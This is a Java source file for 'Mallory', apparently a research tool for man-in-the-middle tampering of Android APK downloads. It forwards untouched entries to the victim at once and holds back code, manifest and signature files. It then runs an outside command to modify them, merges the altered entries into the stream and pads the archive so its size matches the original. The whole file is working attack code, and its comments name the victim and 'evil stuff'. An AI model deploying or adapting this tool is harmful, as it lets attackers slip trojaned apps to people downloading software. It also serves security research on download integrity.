/*
 * Copyright (C) 2014 ph4r05
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package cz.muni.fi.xklinec.zipstream;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.CRC32;
import java.util.zip.Deflater;
import org.apache.commons.compress.archivers.zip.UnparseableExtraFieldData;
import org.apache.commons.compress.archivers.zip.UnrecognizedExtraField;
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
import org.apache.commons.compress.archivers.zip.ZipArchiveInputStream;
import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;
import org.apache.commons.compress.archivers.zip.ZipExtraField;
import org.apache.commons.compress.archivers.zip.ZipShort;
import org.apache.commons.io.FileUtils;
import org.bouncycastle.util.io.TeeInputStream;
import org.kohsuke.args4j.Argument;
import org.kohsuke.args4j.CmdLineException;
import org.kohsuke.args4j.CmdLineParser;
import org.kohsuke.args4j.ExampleMode;
import org.kohsuke.args4j.Option;

/**
 *
 * @author ph4r05
 */
public class Mallory {
    public static final String TEMP_DIR = "/tmp/";
    public static final String INPUT_APK_PLACEHOLDER = "<<INPUTAPK>>";
    public static final String OUTPUT_APK_PLACEHOLDER = "<<OUTPUTAPK>>";
    
    public static final int END_OF_CENTRAL_DIR_SIZE = 22;
    public static final int EXTRA_FIELD_SIZE = 8;
    public static final int MAX_EXTRA_SIZE = 40000;
    public static final int PAD_BLOCK_MAX = MAX_EXTRA_SIZE + EXTRA_FIELD_SIZE;
    public static final int PAD_SIGNATURE = 0x12345;
    
    public static final int DEFAULT_PADDING_EXTRA = 4096;
    
    public static final String ANDROID_MANIFEST = "AndroidManifest.xml";
    public static final String CLASSES = "classes.dex";
    public static final String META_INF = "META-INF";
    public static final String RESOURCES = "resources.arsc";
    
    // receives other command line parameters than options
    @Argument
    private final List<String> arguments = new ArrayList<String>(8);
    
    @Option(name = "--cmd", aliases = {"-c"}, usage = "Command for APK modification. APK to modify will be passed as the first argument. "
            + "After command is finished, inputfile_mod.apk is axpected in the same folder as a result of modification. If not provided, "
            + "modification will be simulated. ")
    private String cmd=null;
    
    @Option(name = "--format", aliases = {"-f"}, usage = "Format of the cmd call. \n0=input APK file name is appended to the cmd"
            + "\n1=input apk is substituted for placeholder " + INPUT_APK_PLACEHOLDER
            + "\n2=as 1 + output apk is substituted for placeholder " + OUTPUT_APK_PLACEHOLDER)
    private int cmdFormat=0;
    
    @Option(name = "--out", aliases = {"-o"}, usage = "Tampered APK filename (after tampering is finished, this is read for diff.).")
    private String outFile;
    
    @Option(name = "--quiet", aliases = {"-q"}, usage = "No output on stderr.")
    private boolean quiet = false;
    
    @Option(name = "--zip-align", aliases = {"-z"}, usage = "Apply ZIP align on resulting APK (stream output).")
    private boolean zipAlign = false;
    
    @Option(name = "--output-size", aliases = {"-s"}, usage = "Desired size of the resulting APK in bytes. By default size(original_APK)+0.")
    private long outBytes = 0;
    
    @Option(name = "--padd-extra", aliases = {"-p"}, usage = "Desired padding of the resulting APK in bytes. Is used only if output-size is zero.\nsize(out_APK) = size(original_APK) + padd_extra.")
    private long paddExtra = 0;
    
    @Option(name = "--exclude", aliases = {"-e"}, usage = "Exclude regex for postponing files")
    private List<String> exclude = new ArrayList<String>();
    
    @Option(name = "--recompute-crc32", aliases = {"-r"}, usage = "Recomputes CRC32 for ZIP entries to avoid invalid CRC.")
    private boolean recomputeCrc = false;
    
    private static Mallory runningInstance;
    public static void main(String[] args) {
        try {
            // do main on instance
            runningInstance = new Mallory();

            // do the main
            runningInstance.doMain(args);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private OutputStream fos = null;
    private InputStream  fis = null;
    private BufferedInputStream bis = null;
    private BufferedOutputStream bos = null;
    private Deflater def;
    private ZipArchiveInputStream zip;
    private ZipArchiveOutputStream zop;
    private File newApk;
    private File tempApk;
    private Set<String> sentFiles;
    
    private final CRC32 crc = new CRC32();
    
    /**
     * List of all sent files, with data and hashes.
     */
    private Map<String, PostponedEntry> alMap;
    
    /**
     * Size of padding in bytes to desired size.
     */
    private long padlen;
    
    /**
     * Entry point. 
     * 
     * @param args
     * @throws FileNotFoundException
     * @throws IOException
     * @throws NoSuchFieldException
     * @throws ClassNotFoundException
     * @throws NoSuchMethodException 
     */
    public void doMain( String[] args ) throws FileNotFoundException, IOException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InterruptedException, CloneNotSupportedException
    {   
        // command line argument parser
        CmdLineParser parser = new CmdLineParser(this);

        // if you have a wider console, you could increase the value;
        // here 80 is also the default
        parser.setUsageWidth(80);
        try {
            // parse the arguments.
            parser.parseArgument(args);
        } catch (CmdLineException e) {
            // if there's a problem in the command line,
            // you'll get this exception. this will report
            // an error message.
            System.err.println(e.getMessage());
            System.err.println("java Mallory [options...] arguments...");
            // print the list of available options
            parser.printUsage(System.err);
            System.err.println();

            // print option sample. This is useful some time
            System.err.println(" Example: java Mallory " + parser.printExample(ExampleMode.ALL));
            return;
        }
             
        if (arguments.size()==2){
            final String a0 = arguments.get(0);
            final String a1 = arguments.get(1);
            
            if (!quiet) System.err.println(String.format("Will use file [%s] as input file and [%s] as output file", a0, a1));
            fis = new FileInputStream(a0);
            fos = new FileOutputStream(a1);
        } else if (arguments.isEmpty()){
            if (!quiet) System.err.println(String.format("Will use file [STDIN] as input file and [STDOUT] as output file"));
            fis = System.in;
            fos = System.out;
        } else {
            if (!quiet) System.err.println("I do not understand the usage.");
            return;
        }
        
        if (zipAlign){
            System.err.println("WARNING: ZIP Align feature not implemented yet...");
            return;
        }
        
        // Deflater to re-compress uncompressed data read from ZIP stream.
        def = new Deflater(9, true);
        sentFiles = new HashSet<String>();
        
        // Buffer input stream so input stream is read in chunks
        bis = new BufferedInputStream(fis);
        bos = new BufferedOutputStream(fos);
        
        // Generate temporary APK filename
        tempApk = File.createTempFile("temp_apk", ".apk", new File(TEMP_DIR));
        if (tempApk.canWrite()==false){
            throw new IOException("Temp file is not writable!");
        }
        
        FileOutputStream tos = new FileOutputStream(tempApk);
        
        // What we want here is to read input stream from the socket/pipe 
        // whatever, process it in ZIP logic and simultaneously to copy 
        // all read data to the temporary file - this reminds tee command
        // logic. This functionality can be found in TeeInputStream.
        TeeInputStream tis = new TeeInputStream(bis, tos);
        
        // Providing tis to ZipArchiveInputStream will copy all read data
        // to temporary tos file.
        zip = new ZipArchiveInputStream(tis);
        
        // List of all sent files, with data and hashes
        alMap = new HashMap<String, PostponedEntry>();
        
        // Output stream
        zop = new ZipArchiveOutputStream(bos);
        zop.setLevel(9);
        
        if (!quiet){
            System.err.println("Patterns that will be excluded:");
            for(String regex : exclude){
                System.err.println("  '"+regex+"'");
            }
            System.err.println();
        }
        
        // Read the archive
        ZipArchiveEntry ze = zip.getNextZipEntry();
        while(ze!=null){
            
            ZipExtraField[] extra = ze.getExtraFields(true);
            byte[] lextra = ze.getLocalFileDataExtra();
            UnparseableExtraFieldData uextra = ze.getUnparseableExtraFieldData();
            byte[] uextrab = uextra != null ? uextra.getLocalFileDataData() : null;
            byte[] ex = ze.getExtra();
            // ZipArchiveOutputStream.DEFLATED
            // 
            
            // Data for entry
            byte[] byteData = Utils.readAll(zip);
            byte[] deflData = new byte[0];
            int infl = byteData.length;
            int defl = 0;
            
            // If method is deflated, get the raw data (compress again).
            // Since ZIPStream automatically decompresses deflated files in read().
            if (ze.getMethod() == ZipArchiveOutputStream.DEFLATED){
                def.reset();
                def.setInput(byteData);
                def.finish();
                
                byte[] deflDataTmp = new byte[byteData.length*2];
                defl = def.deflate(deflDataTmp);
                
                deflData = new byte[defl];
                System.arraycopy(deflDataTmp, 0, deflData, 0, defl);
            }
            
            if (!quiet)
                System.err.println(String.format("ZipEntry: meth=%d "
                    + "size=%010d isDir=%5s "
                    + "compressed=%07d extra=%d lextra=%d uextra=%d ex=%d "
                    + "comment=[%s] "
                    + "dataDesc=%s "
                    + "UTF8=%s "
                    + "infl=%07d defl=%07d "
                    + "name [%s]", 
                    ze.getMethod(),
                    ze.getSize(), ze.isDirectory(),
                    ze.getCompressedSize(),
                    extra!=null  ?  extra.length : -1,
                    lextra!=null ? lextra.length : -1,
                    uextrab!=null ? uextrab.length : -1,
                    ex!=null ? ex.length : -1,
                    ze.getComment(),
                    ze.getGeneralPurposeBit().usesDataDescriptor(),
                    ze.getGeneralPurposeBit().usesUTF8ForNames(),
                    infl, defl,
                    ze.getName()));
            
            final String curName = ze.getName();
            
            // Store zip entry to the map for later check after the APK is recompiled.
            // Hashes will be compared with the modified APK files after the process.
            PostponedEntry al = new PostponedEntry(ze, byteData, deflData);
            alMap.put(curName, al);
            
            // META-INF files should be always on the end of the archive, 
            // thus add postponed files right before them
            if (isPostponed(ze)){
                // Capturing interesting files for us and store for later.
                // If the file is not interesting, send directly to the stream.
                if (!quiet)
                    System.err.println("  Interesting file, postpone sending!!!");
                 
            } else {
                // recompute CRC?
                if (recomputeCrc){
                    crc.reset();
                    crc.update(byteData);
                    final long newCrc = crc.getValue();
                    
                    if (!quiet && ze.getCrc() != newCrc && ze.getCrc() != -1){
                        System.err.println("  Warning: file CRC mismatch!!! Original: ["+ze.getCrc()+"] real: ["+newCrc+"]");
                    }
                        
                    ze.setCrc(newCrc);
                }
                
                // Write ZIP entry to the archive
                zop.putArchiveEntry(ze);
                // Add file data to the stream
                zop.write(byteData, 0, infl);
                zop.closeArchiveEntry();
                bos.flush();
                
                // Mark file as sent.
                addSent(curName);
            }
            
            ze = zip.getNextZipEntry();
        }
        
        // Flush buffers
        zop.flush();
        bos.flush();
        fos.flush();
 
        // Cleaning up stuff, all reading streams can be closed now.
        zip.close();
        bis.close();
        fis.close();
        tis.close();
        tos.close();
        
        //
        // APK is finished here, all non-interesting files were sent to the 
        // zop strem (socket to the victim). Now APK transformation will
        // be performed, diff, sending rest of the files to zop.
        // 
        boolean doPadding = paddExtra > 0 || outBytes > 0;
        long flen = tempApk.length();
        if (outBytes<=0){
            outBytes = flen + paddExtra;
        }
        
        if (!quiet){
            System.err.println("\nAPK reading finished, going to tamper downloaded "
                + " APK file ["+tempApk.toString()+"]; filezise=["+flen+"]");
            
            System.err.println(String.format("Sent so far: %d kB in %f %% after adding padding it is %f %%", 
                    zop.getWritten()/1024, 
                    100.0 * (double)zop.getWritten() / (double)flen,
                    100.0 * (double)zop.getWritten() / ((double)(outBytes > 0 ? outBytes : flen))
            ));
        }
        
        // New APK was generated, new filename = "tempApk_tampered"
        newApk = new File(outFile==null ? getFileName(tempApk.getAbsolutePath()) : outFile);
        
        if (cmd==null){
            // Simulation of doing some evil stuff on the temporary apk
            Thread.sleep(3000);
            
            if (!quiet)
                System.err.println("Tampered APK file: "
                + " ["+newApk.toString()+"]; filezise=["+newApk.length()+"]");
        
            //
            // Since no tampering was performed right now we will simulate it by just simple
            // copying the APK file 
            //
            FileUtils.copyFile(tempApk, newApk);
        } else {
            try {
                // Execute command
                String cmd2exec;
                switch(cmdFormat){
                    case 0: 
                        cmd2exec = cmd + " " + tempApk.getAbsolutePath(); 
                        break;
                    case 1: 
                        cmd2exec = cmd.replaceAll(INPUT_APK_PLACEHOLDER, tempApk.getAbsolutePath());
                        break;
                    case 2:
                        cmd2exec = cmd.replaceAll(INPUT_APK_PLACEHOLDER, tempApk.getAbsolutePath());
                        cmd2exec = cmd2exec.replaceAll(OUTPUT_APK_PLACEHOLDER, newApk.getAbsolutePath());
                        break;
                    default:
                        throw new IllegalArgumentException("Unknown command format number");
                }
                
                if (!quiet){
                    System.err.println("Command to be executed: " + cmd2exec);
                    System.err.println("\n<CMDOUTPUT>");
                }
                
                CmdExecutionResult resExec = execute(cmd2exec, OutputOpt.EXECUTE_STD_COMBINE, null, quiet ? null : System.err);
                
                if (!quiet){
                    System.err.println("</CMDOUTPUT>\n");
                    System.err.println("Command executed. Return value: " + resExec.exitValue);
                }
                
                
            } catch (IOException e) {
                if (!quiet) e.printStackTrace(System.err);
            }
        }
        
        //
        // Now read new APK file with ZipInputStream and push new/modified files to the ZOP.
        //
        fis = new FileInputStream(newApk);
        bis = new BufferedInputStream(fis);
        zip = new ZipArchiveInputStream(bis);
        
        // Merge tampered APK to the final, but in this first time
        // do it to the external buffer in order to get final apk size.
        // Backup ZOP state to the clonned instance.
        zop.flush();
        
        long writtenBeforeDiff = zop.getWritten();
        
        ZipArchiveOutputStream zop_back = zop;
        zop = zop.cloneThis();
        
        // Set temporary byte array output stream, so original output stream is not
        // touched in this phase.
        ByteArrayOutputStream bbos = new ByteArrayOutputStream();
        zop.setOut(bbos);
        
        mergeTamperedApk(false, false);
        zop.flush();
        
        // Now output stream almost contains APK file, central directory is not written yet.
        long writtenAfterDiff = zop.getWritten();
        
        if (!quiet)
            System.err.println(String.format("Tampered apk size yet; writtenBeforeDiff=%d writtenAfterDiff=%d", writtenBeforeDiff, writtenAfterDiff));
        
        // Write central directory header to temporary buffer to discover its size.
        zop.writeFinish();
        zop.flush();
        bbos.flush();
        
        // Read new values
        long writtenAfterCentralDir = zop.getWritten();
        long centralDirLen = zop.getCdLength();
        byte[] buffAfterMerge =  bbos.toByteArray(); 
        //int endOfCentralDir = (int) (buffAfterMerge.length - (writtenAfterCentralDir-writtenBeforeDiff));
        long endOfCentralDir = END_OF_CENTRAL_DIR_SIZE;
        
        // Determine number of bytes to add to APK.
        // padlen is number of bytes missing in APK to meet desired size in bytes.
        padlen = doPadding ? (outBytes - (writtenAfterCentralDir + endOfCentralDir)) : 0;
        
        // Compute number of files needed for padding.
        int padfiles = (int) Math.ceil((double)padlen / (double)(PAD_BLOCK_MAX));
        
        if (!quiet)
            System.err.println(String.format("Remaining to pad=%d, padfiles=%d "
                    + "writtenAfterCentralDir=%d "
                    + "centralDir=%d endOfCentralDir=%d centralDirOffset=%d "
                    + "buffSize=%d total=%d desired=%d ", 
                    padlen, padfiles, writtenAfterCentralDir, 
                    centralDirLen, endOfCentralDir, 
                    zop.getCdOffset(), buffAfterMerge.length, 
                    writtenAfterCentralDir + endOfCentralDir, outBytes));
        
        if (padlen < 0){
            throw new IllegalStateException("Padlen cannot be negative, please increase padding size");
        }
        
        // Close input streams for tampered APK
        try {
            zip.close();
            bis.close();
            fis.close();
        } catch(Exception e){
            if (!quiet)
                e.printStackTrace(System.err);
        }
                
        // Merge again, now with pre-defined padding size.
        fis = new FileInputStream(newApk);
        bis = new BufferedInputStream(fis);
        zip = new ZipArchiveInputStream(bis);
        // Revert changes - use clonned writer stream.
        zop = zop_back;
        
        long writtenBeforeDiff2 = zop.getWritten();
        
        // Merge tampered APK, now for real, now with computed padding.
        mergeTamperedApk(true, true);
        zop.flush();
        
        long writtenAfterMerge2 = zop.getWritten();
        
        // Finish really        
        zop.finish();
        zop.flush();
        
        long writtenReally = zop.getWritten();
        long centralDirLen2 = zop.getCdLength();
        
        if (!quiet)
            System.err.println(String.format("Write stats; "
                    + "writtenBeforeDiff=%d writtenAfterDiff=%d "
                    + "writtenAfterCentralDir=%d centralDir=%d endOfCd=%d centralDirOffset=%d "
                    + "padlen=%d total=%d desired=%d", 
                    writtenBeforeDiff2, writtenAfterMerge2, 
                    writtenReally, centralDirLen2, endOfCentralDir, zop.getCdOffset(),
                    padlen, writtenReally + endOfCentralDir, outBytes));
        
        // Should always be same
        if (!quiet && doPadding && writtenBeforeDiff!=writtenBeforeDiff2){
            System.err.println(String.format("Warning! Size before merge from pass1 and pass2 does not match."));
        }
        
        // If size is different, something went wrong.
        if (!quiet && doPadding && ((writtenReally + endOfCentralDir) != outBytes)){
            System.err.println(String.format("Warning! Output size differs from desired size."));
        }
        
        zop.close();
        bos.close();
        fos.close();
        
        if (!quiet)
            System.err.println("THE END!");
    }
    
    /**
     * Returns true if given file name should be postponed (is modified in tampering process).
     * @param ze 
     * @return  
     */
    public boolean isPostponed(ZipArchiveEntry ze){
        final String curName = ze.getName();
        if (curName.startsWith(META_INF)
                 || CLASSES.equalsIgnoreCase(curName)
                 || ANDROID_MANIFEST.equalsIgnoreCase(curName)
                 || RESOURCES.equalsIgnoreCase(curName)
                 || curName.endsWith(".xml")
                 || (ze.getMethod() == ZipArchiveOutputStream.DEFLATED && curName.endsWith(".png"))){
            return true;
        }
        
        if (exclude!=null && !exclude.isEmpty()){
            for(String regex : exclude){
                if (curName.matches(regex)){
                    return true;
                }
            }
        }
        
        return false;
    }
    
    /**
     * Adds given number of bytes as a null padding to extra field.
     * Minimal padding is 8B. Maximal padding is PAD_BLOCK_MAX.
     * 
     * @param ze
     * @param padlen 
     */
    public void addExtraPadding(ZipArchiveEntry ze, int padlen){
        if (padlen < EXTRA_FIELD_SIZE){
            throw new IllegalArgumentException("Cannot add padding less than 8 B (due to compulsory extra field structure). Given size " + padlen);
        }
        
        if (padlen > PAD_BLOCK_MAX){
            throw new IllegalArgumentException("Specified padding is too big, maximal size is " + PAD_BLOCK_MAX + " given size is " + padlen);
        }
        
        byte[] paddBuff = new byte[padlen-EXTRA_FIELD_SIZE];
        UnrecognizedExtraField zextra =  new UnrecognizedExtraField();
        zextra.setHeaderId(new ZipShort(PAD_SIGNATURE));
        zextra.setLocalFileDataData(new byte[0]);
        zextra.setCentralDirectoryData(paddBuff);
        
        ze.addExtraField(zextra);
    }
    
    /**
     * Computes padding needed to be added to a single file in extra field.
     * Takes maximum block size into consideration, distribution of
     * bytes among different files (minimal padding for one file is 8B).
     * 
     * @return 
     */
    private long compPadding(long padlenLeft){
        long padd2add;
        if (padlenLeft <= PAD_BLOCK_MAX) {
            // padlen left is smaller than max block, thus take whole.
            padd2add = padlenLeft;

        } else {
            // padlenLeft > PAD_BLOCK_MAX.
            // Have to keep in mind that minimal padding for one file is 8 B.
            if (padlenLeft >= 2*PAD_BLOCK_MAX){
                // If twice bigger, remove one maximal slice.
                padd2add = PAD_BLOCK_MAX;

            } else {
                // Less than twice the max block, more than max block, thus take half.
                padd2add = (long) Math.ceil(padlenLeft / 2.0);
            }
        }

        if (padd2add > 0 && padd2add < EXTRA_FIELD_SIZE) {
            throw new IllegalStateException("Cannot add padding less than 8 Bytes");
        }
        
        return padd2add;
    }
    
    /**
     * Reads tampered APK file (zip object is prepared for this file prior 
     * this function call).
     * 
     * If a) file differs or b) file is new, it is added to the output zip stream.
     * 
     * Method also handles padding to a given size. Attribute padlen is used,
     * if addPadding is true, padlen bytes are distributed to {new, modiffied} 
     * files in extra field in central directory. 
     * 
     * @param addPadding
     * @throws IOException 
     */
    public void mergeTamperedApk(boolean addPadding, boolean forReal) throws IOException{
        // Read the tampered archive
        ZipArchiveEntry ze = zip.getNextZipEntry();
        
        Set<String> files = new HashSet<String>();
        long padlenLeft = padlen;
        while(ze!=null){
            
            // Data for entry
            byte[] byteData = Utils.readAll(zip);
            byte[] deflData = new byte[0];
            int defl = 0;
            
            long padd2add=-1;
            if (addPadding){
                padd2add = compPadding(padlenLeft);
            }
            
            // If method is deflated, get the raw data (compress again).
            if (ze.getMethod() == ZipArchiveOutputStream.DEFLATED){
                def.reset();
                def.setInput(byteData);
                def.finish();
                
                byte[] deflDataTmp = new byte[byteData.length*2];
                defl = def.deflate(deflDataTmp);
                
                deflData = new byte[defl];
                System.arraycopy(deflDataTmp, 0, deflData, 0, defl);
            }
            
            final String curName = ze.getName();
            PostponedEntry al = new PostponedEntry(ze, byteData, deflData);
            
            files.add(curName);
            
            // Compare posponed entry with entry in previous
            if (alMap.containsKey(curName)==false || alMap.get(curName)==null){
                // This element is not in the archive at all! 
                // Add it to the zop
                if (!quiet)
                    System.err.println("Detected newly added file ["+curName+"] written prior dump: " + zop.getWritten());
                
                // Apply padding
                if (padd2add>0){
                    addExtraPadding(al.ze, (int) padd2add);
                    padlenLeft -= padd2add;
                    if (!quiet) System.err.println("  Added padding: " + padd2add + "; left: " + padlenLeft);
                }
                    
                al.dump(zop, recomputeCrc);
                
            } else {
                // Check the entry against the old entry hash
                // All files are read linary from the new APK file
                // thus it will be put to the archive in the right order.
                PostponedEntry oldEntry = alMap.get(curName);
                boolean wasPostponed = isPostponed(oldEntry.ze);
                if (  (oldEntry.hashByte==null && al.hashByte!=null)
                   || (oldEntry.hashByte!=null && oldEntry.hashByte.equals(al.hashByte)==false)    
                   || (defl>0 && (oldEntry.hashDefl==null && al.hashDefl!=null))
                   || (defl>0 && (oldEntry.hashDefl!=null && oldEntry.hashDefl.equals(al.hashDefl)==false))
                   ){
                    // Element was changed, add it to the zop 
                    // 
                    if (!quiet){
                        System.err.println("Detected modified file ["+curName+"] written prior dump: " + zop.getWritten());
                        System.err.println("  t1=" + oldEntry.hashByte.equals(al.hashByte) + "; t2=" + oldEntry.hashDefl.equals(al.hashDefl));
                    }
                    
                    if (!wasPostponed && !quiet){
                        System.err.println("  Warning: This file was already sent to the victim (file was not postponed) !!!");
                    }

                    // Apply padding
                    if (padd2add>0){
                        addExtraPadding(al.ze, (int) padd2add);
                        padlenLeft -= padd2add;
                        if (!quiet) System.err.println("  Added padding: " + padd2add + "; left: " + padlenLeft);
                    }
                    
                    al.dump(zop, recomputeCrc);

                } else if (wasPostponed){
                    // File was not modified but is one of the postponed files, thus has to 
                    // be flushed also.
                    if (!quiet)
                        System.err.println("Postponed file not modified ["+curName+"] written prior dump: " + zop.getWritten());

                    // Apply padding
                    if (padd2add>0){
                        addExtraPadding(al.ze, (int) padd2add);
                        padlenLeft -= padd2add;
                        if (!quiet) System.err.println("  Added padding: " + padd2add + "; left: " + padlenLeft);
                    }
                    
                    al.dump(zop, recomputeCrc);
                }
            }
            
            ze = zip.getNextZipEntry();
        }
        
        // Check if some file from the original file is not in the modified file.
        if (forReal && !quiet){
            // Iterate over map files and lookup the same among modified files.
            for(String oldFile : alMap.keySet()){
                if (files.contains(oldFile)==false){
                    if (sentFiles.contains(oldFile)){
                        System.err.println("Warning: File from original file ["+oldFile+"] was not found in tampered file and file was already sent!!!");
                    } else {
                        System.err.println("Warning: File from original file ["+oldFile+"] was not found in tampered file!");
                    }
                }
            }
        }
        
        if (!quiet && addPadding && padlenLeft > 0){
            System.err.println("Warning! Not enough modified files to add required padding. Left: " + padlenLeft + "/" + padlen);
        }
    }
    
    /**
     * Adds given file to a sent map.
     * @param curName 
     */
    private void addSent(String curName) {
        if (sentFiles.contains(curName)) {
            if (!quiet) {
                System.err.println("  Warning: File was already sent, sending twice???");
            }
        } else {
            sentFiles.add(curName);
        }

    }
    
    /**
     * Returns filename for modified apk according to scheme below.
     * original_file.apk --> original_file_mod.apk
     * 
     * @param name
     * @return 
     */
    public String getFileName(String name){
        if (name.endsWith(".apk")==false){
            throw new IllegalArgumentException("Filename has to end on .apk");
        }
        
        name = name.replaceFirst("\\.apk$", "");
        name = name + "_mod.apk";
        
        return name;
    }
    
    /**
     * Enum defining possible ways of handling process output streams.
     */
    public static enum OutputOpt {
        EXECUTE_STDOUT_ONLY,
        EXECUTE_STDERR_ONLY,
        EXECUTE_STD_COMBINE,
        EXECUTE_STD_SEPARATE
    }
    
    /**
     * Wrapper class for job execution result.
     */
    protected static class CmdExecutionResult {
        public int exitValue;
        public String stdErr;
        public String stdOut;
        public long time;
    }
    
    /**
     * Simple helper for executing a command.
     * 
     * @param command
     * @param outOpt
     * @return
     * @throws IOException
     * @throws InterruptedException 
     */
    public CmdExecutionResult execute(final String command, OutputOpt outOpt) throws IOException, InterruptedException{
        return execute(command, outOpt, null, null);
    }
    
    /**
     * Simple helper for executing a command.
     * 
     * @param command
     * @param outOpt
     * @param workingDir
     * @return
     * @throws IOException
     * @throws InterruptedException 
     */
    public CmdExecutionResult execute(final String command, OutputOpt outOpt, File workingDir, OutputStream os) throws IOException, InterruptedException{
        CmdExecutionResult res = new CmdExecutionResult();
        
        // Execute motelist command
        Process p = workingDir == null ? 
                Runtime.getRuntime().exec(command) :
                Runtime.getRuntime().exec(command, null, workingDir);

        // If interested only in stdErr, single thread is OK, otherwise 2 stream
        // reading threads are needed.
        if (outOpt==OutputOpt.EXECUTE_STDERR_ONLY || outOpt==OutputOpt.EXECUTE_STDOUT_ONLY){
            StringBuilder sb = new StringBuilder();
            BufferedReader bri = new BufferedReader(new InputStreamReader(
                            outOpt==OutputOpt.EXECUTE_STDERR_ONLY ? p.getErrorStream() : p.getInputStream()));
            
            String line;
            while ((line = bri.readLine()) != null) {
                sb.append(line).append("\n");
            }
            bri.close();
            
            if (outOpt==OutputOpt.EXECUTE_STDOUT_ONLY)
                res.stdOut = sb.toString();
            else if (outOpt==OutputOpt.EXECUTE_STDERR_ONLY)
                res.stdErr = sb.toString();
            
            // synchronous call, wait for command completion
            p.waitFor();
        } else if (outOpt==OutputOpt.EXECUTE_STD_COMBINE){
            // Combine both streams together
            StreamMerger sm = new StreamMerger(p.getInputStream(), p.getErrorStream());
            if (os!=null){
                sm.setOutputStream(os);
            }
            
            sm.run();
            
            // synchronous call, wait for command completion
            p.waitFor();
            
            res.stdOut = sm.getOutput();
        } else {
            // Consume streams, older jvm's had a memory leak if streams were not read,
            // some other jvm+OS combinations may block unless streams are consumed.
            StreamGobbler errorGobbler  = new StreamGobbler(p.getErrorStream(), true);
            StreamGobbler outputGobbler = new StreamGobbler(p.getInputStream(), true);
            errorGobbler.start();
            outputGobbler.start();
            
            // synchronous call, wait for command completion
            p.waitFor();
            
            res.stdErr = errorGobbler.getOutput();
            res.stdOut = outputGobbler.getOutput();
        }
        
        res.exitValue = p.exitValue();
        return res;
    }    
}
